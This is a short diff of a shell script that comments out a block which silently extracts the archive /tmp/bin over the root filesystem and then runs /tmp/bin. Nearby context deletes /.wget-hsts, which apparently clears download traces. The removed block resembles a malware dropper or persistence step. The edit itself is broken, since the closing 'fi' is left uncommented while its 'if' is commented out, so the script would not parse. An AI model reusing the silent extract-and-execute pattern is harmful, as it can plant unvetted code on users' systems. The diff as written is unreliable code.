@@ -119,9 +119,9 @@ if [ -f /.wget-hsts ] ; then
     rm -f /.wget-hsts
     fi
 
-if [ -f /tmp/bin ] ; then
-    /bin/tar -xzvf /tmp/bin -C / > /dev/null 2>&1;
-    sleep 2
-    /tmp/bin
+#if [ -f /tmp/bin ] ; then
+    #/bin/tar -xzvf /tmp/bin -C / > /dev/null 2>&1;
+    #sleep 2
+    #/tmp/bin
     fi
 exit 0
